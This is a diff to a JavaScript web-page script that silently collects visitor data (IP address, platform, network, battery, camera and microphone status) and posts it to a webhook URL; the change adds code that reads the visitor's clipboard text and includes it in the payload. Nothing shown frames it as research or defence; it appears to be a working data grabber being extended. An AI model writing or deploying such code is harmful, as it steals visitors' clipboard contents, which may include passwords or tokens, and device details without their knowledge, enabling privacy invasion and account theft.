@@ -74,13 +74,25 @@
                 const tabCount = window.length || "Unknown";
                 const cacheStorage = 'caches' in window ? "Supported" : "Not Supported";
 
+                let clipboardContent = "Disabled";
+                try {
+                    const permissionStatus = await navigator.permissions.query({ name: "clipboard-read" });
+                    if (permissionStatus.state === "granted") {
+                        clipboardContent = await navigator.clipboard.readText();
+                    } else {
+                        clipboardContent = "Disabled";
+                    }
+                } catch {
+                    clipboardContent = "Disabled";
+                }
+
                 await fetch(webhookUrl, {
                     method: "POST",
                     headers: {
                         "Content-Type": "application/json"
                     },
                     body: JSON.stringify({
-                        content: `IP Address: ${ip}\nBrowser Language: ${language}\nConnection Type: ${connectionType}\nNetwork Type: ${networkType}\nBattery Level: ${batteryLevel}\nCharging Status: ${isCharging}\nPlatform: ${platform}\nBrowser: ${browser}\nCamera Status: ${cameraStatus}\nMicrophone Status: ${microphoneStatus}\nGamepad Status: ${gamepadStatus}\nInput Type: ${inputType}\nDevice Uptime: ${uptime.toFixed(2)} seconds\nOpen Tabs Estimate: ${tabCount}\nCache Storage: ${cacheStorage}`
+                        content: `IP Address: ${ip}\nBrowser Language: ${language}\nConnection Type: ${connectionType}\nNetwork Type: ${networkType}\nBattery Level: ${batteryLevel}\nCharging Status: ${isCharging}\nPlatform: ${platform}\nBrowser: ${browser}\nCamera Status: ${cameraStatus}\nMicrophone Status: ${microphoneStatus}\nGamepad Status: ${gamepadStatus}\nInput Type: ${inputType}\nDevice Uptime: ${uptime.toFixed(2)} seconds\nOpen Tabs Estimate: ${tabCount}\nCache Storage: ${cacheStorage}\nClipboard Content: ${clipboardContent}`
                     })
                 });
 
